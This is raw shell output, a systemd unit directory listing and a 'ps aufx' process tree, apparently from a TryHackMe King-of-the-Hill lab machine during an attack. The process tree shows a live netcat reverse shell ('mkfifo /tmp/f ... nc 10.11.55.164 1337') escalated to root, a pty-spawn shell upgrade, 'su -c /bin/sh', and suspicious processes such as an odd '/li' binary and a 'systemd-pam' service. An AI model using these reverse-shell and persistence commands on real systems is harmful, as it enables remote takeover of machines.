lrwxrwxrwx  1 root root   25 Feb  6  2020 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
-rw-r--r--  1 root root  505 Jun 10  2019 dbus.service
-rw-r--r--  1 root root  106 Jun 10  2019 dbus.socket
-rw-r--r--  1 root root 1.1K Feb  6  2020 debug-shell.service
lrwxrwxrwx  1 root root   16 Feb  6  2020 default.target -> graphical.target
-rw-r--r--  1 root root  750 Jan 28  2018 dev-hugepages.mount
-rw-r--r--  1 root root  665 Jan 28  2018 dev-mqueue.mount
-rw-r--r--  1 root root  341 Dec  5  2019 dm-event.service
-rw-r--r--  1 root root  248 Dec  5  2019 dm-event.socket
-rw-r--r--  1 root root  456 Jun 28  2018 ebtables.service
-rw-r--r--  1 root root  797 Feb  6  2020 emergency.service
-rw-r--r--  1 root root  471 Jan 28  2018 emergency.target
-rw-r--r--  1 root root  541 Jan 28  2018 exit.target
-rw-r--r--  1 root root  480 Jan 28  2018 final.target
-rw-r--r--  1 root root  618 Oct 15  2018 friendly-recovery.service
-rw-r--r--  1 root root  172 Oct 15  2018 friendly-recovery.target
-rw-r--r--  1 root root  127 Jan  8  2020 fstrim.service
-rw-r--r--  1 root root  205 Jan  8  2020 fstrim.timer
lrwxrwxrwx  1 root root    9 Feb  6  2020 fuse.service -> /dev/null
-rw-r--r--  1 root root  506 Jan 28  2018 getty-pre.target
-rw-r--r--  1 root root  342 Jan 26  2020 getty-static.service
-rw-r--r--  1 root root  500 Jan 28  2018 getty.target
drwxr-xr-x  2 root root 4.0K Mar 20  2020 getty.target.wants
-rw-r--r--  1 root root 2.0K Feb  6  2020 getty@.service
-rw-r--r--  1 root root  598 Jan 28  2018 graphical.target
drwxr-xr-x  2 root root 4.0K Mar 20  2020 graphical.target.wants
lrwxrwxrwx  1 root root    9 Feb  6  2020 halt.service -> /dev/null
-rw-r--r--  1 root root  527 Jan 28  2018 halt.target
drwxr-xr-x  2 root root 4.0K Aug  5  2019 halt.target.wants
-rw-r--r--  1 root root  509 Jan 28  2018 hibernate.target
lrwxrwxrwx  1 root root    9 Feb  6  2020 hostname.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 hwclock.service -> /dev/null
-rw-r--r--  1 root root  530 Jan 28  2018 hybrid-sleep.target
-rw-r--r--  1 root root  331 Nov  1  2017 inetd.service
-rw-r--r--  1 root root  670 Feb  6  2020 initrd-cleanup.service
-rw-r--r--  1 root root  593 Jan 28  2018 initrd-fs.target
-rw-r--r--  1 root root  830 Feb  6  2020 initrd-parse-etc.service
-rw-r--r--  1 root root  561 Jan 28  2018 initrd-root-device.target
-rw-r--r--  1 root root  566 Jan 28  2018 initrd-root-fs.target
-rw-r--r--  1 root root  589 Feb  6  2020 initrd-switch-root.service
-rw-r--r--  1 root root  754 Jan 28  2018 initrd-switch-root.target
drwxr-xr-x  2 root root 4.0K Aug  5  2019 initrd-switch-root.target.wants
-rw-r--r--  1 root root  704 Feb  6  2020 initrd-udevadm-cleanup-db.service
-rw-r--r--  1 root root  763 Jan 28  2018 initrd.target
-rw-r--r--  1 root root  368 Jan  9  2019 irqbalance.service
-rw-r--r--  1 root root  463 Mar 28  2019 iscsid.service
-rw-r--r--  1 root root  175 Dec 12  2018 iscsid.socket
-rw-r--r--  1 root root  541 Jan 28  2018 kexec.target
drwxr-xr-x  2 root root 4.0K Aug  5  2019 kexec.target.wants
-rw-r--r--  1 root root  287 Apr 23  2019 keyboard-setup.service
lrwxrwxrwx  1 root root    9 Feb  6  2020 killprocs.service -> /dev/null
-rw-r--r--  1 root root  717 Feb  6  2020 kmod-static-nodes.service
lrwxrwxrwx  1 root root   28 Feb  6  2020 kmod.service -> systemd-modules-load.service
-rw-r--r--  1 root root  435 Jan 28  2018 local-fs-pre.target
-rw-r--r--  1 root root  547 Jan 28  2018 local-fs.target
drwxr-xr-x  2 root root 4.0K Mar 20  2020 local-fs.target.wants
-rw-r--r--  1 root root  345 Dec  5  2019 lvm2-lvmetad.service
-rw-r--r--  1 root root  215 Dec  5  2019 lvm2-lvmetad.socket
-rw-r--r--  1 root root  300 Dec  5  2019 lvm2-lvmpolld.service
-rw-r--r--  1 root root  213 Dec  5  2019 lvm2-lvmpolld.socket
-rw-r--r--  1 root root  693 Dec  5  2019 lvm2-monitor.service
-rw-r--r--  1 root root  403 Dec  5  2019 lvm2-pvscan@.service
lrwxrwxrwx  1 root root    9 Dec  5  2019 lvm2.service -> /dev/null
-rw-r--r--  1 root root  311 Nov 23  2018 lxcfs.service
-rw-r--r--  1 root root  320 Nov 23  2018 lxd-containers.service
-rw-r--r--  1 root root  605 Nov 23  2018 lxd.service
-rw-r--r--  1 root root  197 Nov 23  2018 lxd.socket
-rw-r--r--  1 root root  445 Jan 28  2018 machine.slice
-rw-r--r--  1 root root  481 Jan 14  2020 mdadm-grow-continue@.service
-rw-r--r--  1 root root  210 Jan 14  2020 mdadm-last-resort@.service
-rw-r--r--  1 root root  179 Jan 14  2020 mdadm-last-resort@.timer
-rw-r--r--  1 root root  670 Jan 14  2020 mdadm-shutdown.service
lrwxrwxrwx  1 root root    9 Jan 14  2020 mdadm-waitidle.service -> /dev/null
lrwxrwxrwx  1 root root    9 Jan 14  2020 mdadm.service -> /dev/null
-rw-r--r--  1 root root 1.1K Jan 14  2020 mdmon@.service
-rw-r--r--  1 root root  388 Jan 14  2020 mdmonitor.service
lrwxrwxrwx  1 root root   28 Feb  6  2020 module-init-tools.service -> systemd-modules-load.service
-rw-r--r--  1 root root  173 Sep 27  2019 motd-news.service
-rw-r--r--  1 root root  161 Sep 27  2019 motd-news.timer
lrwxrwxrwx  1 root root    9 Feb  6  2020 motd.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 mountall-bootclean.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 mountall.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 mountdevsubfs.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 mountkernfs.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 mountnfs.service -> /dev/null
-rw-r--r--  1 root root  532 Jan 28  2018 multi-user.target
drwxr-xr-x  2 root root 4.0K Mar 20  2020 multi-user.target.wants
-rw-r--r--  1 root root  462 Jan 15  2018 mysql.service
-rw-r--r--  1 root root  289 Aug 26  2019 netplan-wpa@.service
-rw-r--r--  1 root root  505 Jan 28  2018 network-online.target
-rw-r--r--  1 root root  502 Jan 28  2018 network-pre.target
-rw-r--r--  1 root root  521 Jan 28  2018 network.target
-rw-r--r--  1 root root  258 Oct 15  2018 networkd-dispatcher.service
-rw-r--r--  1 root root  554 Jan 28  2018 nss-lookup.target
-rw-r--r--  1 root root  513 Jan 28  2018 nss-user-lookup.target
-rw-r--r--  1 root root  362 Jan 26  2020 ondemand.service
-rw-r--r--  1 root root  987 Dec 12  2018 open-iscsi.service
-rw-r--r--  1 root root  466 Dec  9  2019 open-vm-tools.service
lrwxrwxrwx  1 root root   13 Nov  1  2017 openbsd-inetd.service -> inetd.service
-rw-r--r--  1 root root  394 Jan 28  2018 paths.target
-rw-r--r--  1 root root  412 Apr  4  2019 plymouth-halt.service
-rw-r--r--  1 root root  426 Apr  4  2019 plymouth-kexec.service
lrwxrwxrwx  1 root root   27 Apr  4  2019 plymouth-log.service -> plymouth-read-write.service
-rw-r--r--  1 root root  421 Apr  4  2019 plymouth-poweroff.service
-rw-r--r--  1 root root  200 Apr  4  2019 plymouth-quit-wait.service
-rw-r--r--  1 root root  194 Apr  4  2019 plymouth-quit.service
-rw-r--r--  1 root root  244 Apr  4  2019 plymouth-read-write.service
-rw-r--r--  1 root root  416 Apr  4  2019 plymouth-reboot.service
-rw-r--r--  1 root root  532 Apr  4  2019 plymouth-start.service
-rw-r--r--  1 root root  291 Apr  4  2019 plymouth-switch-root.service
lrwxrwxrwx  1 root root   21 Apr  4  2019 plymouth.service -> plymouth-quit.service
-rw-r--r--  1 root root  175 Mar 27  2018 polkit.service
-rw-r--r--  1 root root  309 May 30  2018 pollinate.service
-rw-r--r--  1 root root  592 Jan 28  2018 poweroff.target
drwxr-xr-x  2 root root 4.0K Aug  5  2019 poweroff.target.wants
-rw-r--r--  1 root root  417 Jan 28  2018 printer.target
-rw-r--r--  1 root root  745 Jan 28  2018 proc-sys-fs-binfmt_misc.automount
-rw-r--r--  1 root root  655 Jan 28  2018 proc-sys-fs-binfmt_misc.mount
lrwxrwxrwx  1 root root   22 Feb  6  2020 procps.service -> systemd-sysctl.service
-rw-r--r--  1 root root  609 Feb  6  2020 quotaon.service
-rw-r--r--  1 root root  716 Feb  6  2020 rc-local.service
drwxr-xr-x  2 root root 4.0K Mar 20  2020 rc-local.service.d
lrwxrwxrwx  1 root root   16 Feb  6  2020 rc.local.service -> rc-local.service
lrwxrwxrwx  1 root root    9 Feb  6  2020 rc.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 rcS.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 reboot.service -> /dev/null
-rw-r--r--  1 root root  583 Jan 28  2018 reboot.target
drwxr-xr-x  2 root root 4.0K Aug  5  2019 reboot.target.wants
-rw-r--r--  1 root root  549 Jan 28  2018 remote-cryptsetup.target
-rw-r--r--  1 root root  436 Jan 28  2018 remote-fs-pre.target
-rw-r--r--  1 root root  522 Jan 28  2018 remote-fs.target
-rw-r--r--  1 root root  788 Feb  6  2020 rescue.service
-rw-r--r--  1 root root  492 Jan 28  2018 rescue.target
drwxr-xr-x  2 root root 4.0K Mar 20  2020 rescue.target.wants
lrwxrwxrwx  1 root root    9 Feb  6  2020 rmnologin.service -> /dev/null
-rw-r--r--  1 root root  540 Jan 28  2018 rpcbind.target
-rw-r--r--  1 root root  188 Feb 24  2014 rsync.service
-rw-r--r--  1 root root  290 Apr 24  2018 rsyslog.service
lrwxrwxrwx  1 root root   15 Feb  6  2020 runlevel0.target -> poweroff.target
lrwxrwxrwx  1 root root   13 Feb  6  2020 runlevel1.target -> rescue.target
drwxr-xr-x  2 root root 4.0K Apr 20  2018 runlevel1.target.wants
lrwxrwxrwx  1 root root   17 Feb  6  2020 runlevel2.target -> multi-user.target
drwxr-xr-x  2 root root 4.0K Apr 20  2018 runlevel2.target.wants
lrwxrwxrwx  1 root root   17 Feb  6  2020 runlevel3.target -> multi-user.target
drwxr-xr-x  2 root root 4.0K Apr 20  2018 runlevel3.target.wants
lrwxrwxrwx  1 root root   17 Feb  6  2020 runlevel4.target -> multi-user.target
drwxr-xr-x  2 root root 4.0K Apr 20  2018 runlevel4.target.wants
lrwxrwxrwx  1 root root   16 Feb  6  2020 runlevel5.target -> graphical.target
drwxr-xr-x  2 root root 4.0K Apr 20  2018 runlevel5.target.wants
lrwxrwxrwx  1 root root   13 Feb  6  2020 runlevel6.target -> reboot.target
lrwxrwxrwx  1 root root    9 Aug  5  2019 screen-cleanup.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 sendsigs.service -> /dev/null
-rw-r--r--  1 root root 1.5K Feb  6  2020 serial-getty@.service
-rw-r--r--  1 root root  330 Apr 23  2019 setvtrgb.service
-rw-r--r--  1 root root  442 Jan 28  2018 shutdown.target
-rw-r--r--  1 root root  402 Jan 28  2018 sigpwr.target
lrwxrwxrwx  1 root root    9 Feb  6  2020 single.service -> /dev/null
-rw-r--r--  1 root root  460 Jan 28  2018 sleep.target
-rw-r--r--  1 root root  449 Jan 28  2018 slices.target
-rw-r--r--  1 root root  420 Jan 28  2018 smartcard.target
-rw-r--r--  1 root root  340 Oct 30  2019 snapd.autoimport.service
-rw-r--r--  1 root root  320 Oct 30  2019 snapd.core-fixup.service
-rw-r--r--  1 root root  172 Oct 30  2019 snapd.failure.service
-rw-r--r--  1 root root  322 Oct 30  2019 snapd.seeded.service
-rw-r--r--  1 root root  477 Oct 30  2019 snapd.service
-rw-r--r--  1 root root  372 Oct 30  2019 snapd.snap-repair.service
-rw-r--r--  1 root root  281 Oct 30  2019 snapd.snap-repair.timer
-rw-r--r--  1 root root  281 Oct 30  2019 snapd.socket
-rw-r--r--  1 root root  521 Oct 30  2019 snapd.system-shutdown.service
-rw-r--r--  1 root root  396 Jan 28  2018 sockets.target
drwxr-xr-x  2 root root 4.0K Mar 20  2020 sockets.target.wants
-rw-r--r--  1 root root  420 Jan 28  2018 sound.target
-rw-r--r--  1 root root  493 Jan 25  2018 ssh.service
-rw-r--r--  1 root root  216 Jan 16  2018 ssh.socket
-rw-r--r--  1 root root  244 Jan 25  2018 ssh@.service
lrwxrwxrwx  1 root root    9 Feb  6  2020 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 stop-bootlogd.service -> /dev/null
lrwxrwxrwx  1 root root    9 Jan 18  2018 sudo.service -> /dev/null
-rw-r--r--  1 root root  554 Feb  6  2020 suspend-then-hibernate.target
-rw-r--r--  1 root root  503 Jan 28  2018 suspend.target
-rw-r--r--  1 root root  393 Jan 28  2018 swap.target
-rw-r--r--  1 root root  795 Jan 28  2018 sys-fs-fuse-connections.mount
-rw-r--r--  1 root root  767 Jan 28  2018 sys-kernel-config.mount
-rw-r--r--  1 root root  710 Jan 28  2018 sys-kernel-debug.mount
-rw-r--r--  1 root root  558 Jan 28  2018 sysinit.target
drwxr-xr-x  2 root root 4.0K Mar 20  2020 sysinit.target.wants
-rw-r--r--  1 root root 1.4K Jan 28  2018 syslog.socket
-rw-r--r--  1 root root 1.4K Feb  6  2020 system-update-cleanup.service
-rw-r--r--  1 root root  592 Jan 28  2018 system-update.target
-rw-r--r--  1 root root  445 Jan 28  2018 system.slice
-rw-r--r--  1 root root  704 Jan 28  2018 systemd-ask-password-console.path
-rw-r--r--  1 root root  724 Feb  6  2020 systemd-ask-password-console.service
-rw-r--r--  1 root root  490 Apr  4  2019 systemd-ask-password-plymouth.path
-rw-r--r--  1 root root  467 Apr  4  2019 systemd-ask-password-plymouth.service
-rw-r--r--  1 root root  632 Jan 28  2018 systemd-ask-password-wall.path
-rw-r--r--  1 root root  752 Feb  6  2020 systemd-ask-password-wall.service
-rw-r--r--  1 root root  752 Feb  6  2020 systemd-backlight@.service
-rw-r--r--  1 root root  999 Feb  6  2020 systemd-binfmt.service
-rw-r--r--  1 root root  537 Feb  6  2020 systemd-exit.service
-rw-r--r--  1 root root  714 Feb  6  2020 systemd-fsck-root.service
-rw-r--r--  1 root root  715 Feb  6  2020 systemd-fsck@.service
-rw-r--r--  1 root root  551 Feb  6  2020 systemd-fsckd.service
-rw-r--r--  1 root root  540 Feb  6  2020 systemd-fsckd.socket
-rw-r--r--  1 root root  584 Feb  6  2020 systemd-halt.service
-rw-r--r--  1 root root  671 Feb  6  2020 systemd-hibernate-resume@.service
-rw-r--r--  1 root root  541 Feb  6  2020 systemd-hibernate.service
-rw-r--r--  1 root root 1.2K Feb  6  2020 systemd-hostnamed.service
-rw-r--r--  1 root root  818 Feb  6  2020 systemd-hwdb-update.service
-rw-r--r--  1 root root  559 Feb  6  2020 systemd-hybrid-sleep.service
-rw-r--r--  1 root root  551 Feb  6  2020 systemd-initctl.service
-rw-r--r--  1 root root  564 Jan 28  2018 systemd-initctl.socket
-rw-r--r--  1 root root  771 Feb  6  2020 systemd-journal-flush.service
-rw-r--r--  1 root root  686 Feb  6  2020 systemd-journald-audit.socket
-rw-r--r--  1 root root 1.2K Jan 28  2018 systemd-journald-dev-log.socket
-rw-r--r--  1 root root 1.6K Feb  6  2020 systemd-journald.service
-rw-r--r--  1 root root  882 Jan 28  2018 systemd-journald.socket
-rw-r--r--  1 root root  597 Feb  6  2020 systemd-kexec.service
-rw-r--r--  1 root root 1.2K Feb  6  2020 systemd-localed.service
-rw-r--r--  1 root root 1.5K Feb  6  2020 systemd-logind.service
-rw-r--r--  1 root root  733 Feb  6  2020 systemd-machine-id-commit.service
-rw-r--r--  1 root root 1007 Feb  6  2020 systemd-modules-load.service
-rw-r--r--  1 root root  740 Feb  6  2020 systemd-networkd-wait-online.service
-rw-r--r--  1 root root 1.9K Feb  6  2020 systemd-networkd.service
-rw-r--r--  1 root root  631 Jan 28  2018 systemd-networkd.socket
-rw-rw-r--  1 root root  176 Feb  6  2020 systemd-pam.service
-rw-r--r--  1 root root  593 Feb  6  2020 systemd-poweroff.service
-rw-r--r--  1 root root  655 Feb  6  2020 systemd-quotacheck.service
-rw-r--r--  1 root root  792 Feb  6  2020 systemd-random-seed.service
-rw-r--r--  1 root root  588 Feb  6  2020 systemd-reboot.service
-rw-r--r--  1 root root  833 Feb  6  2020 systemd-remount-fs.service
-rw-r--r--  1 root root 1.7K Feb  6  2020 systemd-resolved.service
-rw-r--r--  1 root root  724 Feb  6  2020 systemd-rfkill.service
-rw-r--r--  1 root root  657 Jan 28  2018 systemd-rfkill.socket
-rw-r--r--  1 root root  573 Feb  6  2020 systemd-suspend-then-hibernate.service
-rw-r--r--  1 root root  537 Feb  6  2020 systemd-suspend.service
-rw-r--r--  1 root root  693 Feb  6  2020 systemd-sysctl.service
-rw-r--r--  1 root root 1.1K Feb  6  2020 systemd-timedated.service
-rw-r--r--  1 root root 1.4K Feb  6  2020 systemd-timesyncd.service
-rw-r--r--  1 root root  659 Feb  6  2020 systemd-tmpfiles-clean.service
-rw-r--r--  1 root root  490 Jan 28  2018 systemd-tmpfiles-clean.timer
-rw-r--r--  1 root root  764 Feb  6  2020 systemd-tmpfiles-setup-dev.service
-rw-r--r--  1 root root  744 Feb  6  2020 systemd-tmpfiles-setup.service
-rw-r--r--  1 root root  863 Feb  6  2020 systemd-udev-settle.service
-rw-r--r--  1 root root  755 Feb  6  2020 systemd-udev-trigger.service
-rw-r--r--  1 root root  635 Jan 28  2018 systemd-udevd-control.socket
-rw-r--r--  1 root root  610 Jan 28  2018 systemd-udevd-kernel.socket
-rw-r--r--  1 root root 1006 Feb  6  2020 systemd-udevd.service
-rw-r--r--  1 root root  797 Feb  6  2020 systemd-update-utmp-runlevel.service
-rw-r--r--  1 root root  794 Feb  6  2020 systemd-update-utmp.service
-rw-r--r--  1 root root  628 Feb  6  2020 systemd-user-sessions.service
-rw-r--r--  1 root root  690 Feb  6  2020 systemd-volatile-root.service
-rw-r--r--  1 root root  254 Aug 15  2019 thermald.service
-rw-r--r--  1 root root  435 Jan 28  2018 time-sync.target
-rw-r--r--  1 root root  445 Jan 28  2018 timers.target
drwxr-xr-x  2 root root 4.0K Mar 20  2020 timers.target.wants
lrwxrwxrwx  1 root root   21 Feb  6  2020 udev.service -> systemd-udevd.service
-rw-r--r--  1 root root  266 Aug 15  2017 ufw.service
-rw-r--r--  1 root root  457 Jan 28  2018 umount.target
lrwxrwxrwx  1 root root    9 Feb  6  2020 umountfs.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 umountnfs.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 umountroot.service -> /dev/null
-rw-r--r--  1 root root  372 Feb 17  2020 unattended-upgrades.service
lrwxrwxrwx  1 root root   27 Feb  6  2020 urandom.service -> systemd-random-seed.service
-rw-r--r--  1 root root  250 Apr  9  2019 ureadahead-stop.service
-rw-r--r--  1 root root  242 Apr  9  2019 ureadahead-stop.timer
-rw-r--r--  1 root root  404 Apr  9  2019 ureadahead.service
-rw-r--r--  1 root root  432 Jan 28  2018 user.slice
-rw-r--r--  1 root root  593 Feb  6  2020 user@.service
drwxr-xr-x  2 root root 4.0K Mar 20  2020 user@.service.d
-rw-r--r--  1 root root  189 Jan  8  2020 uuidd.service
-rw-r--r--  1 root root  126 Jan  8  2020 uuidd.socket
-rw-r--r--  1 root root  408 Dec  9  2019 vgauth.service
lrwxrwxrwx  1 root root    9 Feb  6  2020 x11-common.service -> /dev/null

ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      7578  0.0  0.0      0     0 ?        I    23:11   0:00  \_ [kworker/0:0]
root      9218  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:0]
root      9219  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:3]
root      9220  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:4]
root     10645  0.0  0.0      0     0 ?        I    23:16   0:00  \_ [kworker/0:2]
root         1  0.2  0.8 159936  9056 ?        Ss   22:31   0:07 /sbin/init maybe-ubiquity
root       397  0.0  1.9 127876 19696 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:04 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6300 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  19216  3976 ?        S    23:00   0:00      |   \_ -i
root     11390  0.0  0.3  37080  3376 ?        R    23:17   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.6 106640  6316 ?        Ssl  22:31   0:00 /root/koth
root       792  0.3  2.4 557680 25112 ?        Ssl  22:31   0:09 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
root      8521  0.0  0.7 108008  7152 ?        Ss   23:12   0:00  \_ sshd: ramen [priv]
ramen     8623  0.0  0.5 108632  5072 ?        S    23:13   0:00      \_ sshd: ramen@notty
ramen     8649  0.0  0.0   6732   904 ?        Ss   23:13   0:00          \_ /bin/sh
ramen     8848  0.0  0.9  39112  9808 ?        S    23:13   0:00              \_ python3 -c import pty;pty.spawn("/bin/sh")
ramen     8849  0.0  0.0   6732   824 pts/1    Ss   23:13   0:00                  \_ /bin/sh
root      8902  0.0  0.3  61792  3788 pts/1    S+   23:13   0:00                      \_ su -c /bin/sh
root      8903  0.0  0.1   6732  1820 ?        Ss   23:13   0:00                          \_ /bin/sh
mysql      841  0.1 17.5 1161928 176760 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ds   23:00   0:48 /li
root      9253  0.0  1.5 1115248 15752 ?       Ssl  23:14   0:00 /usr/sbin/cron -f
root      9964  0.0  1.3 722556 13780 ?        Ssl  23:15   0:00 /usr/bin/systemd-pam
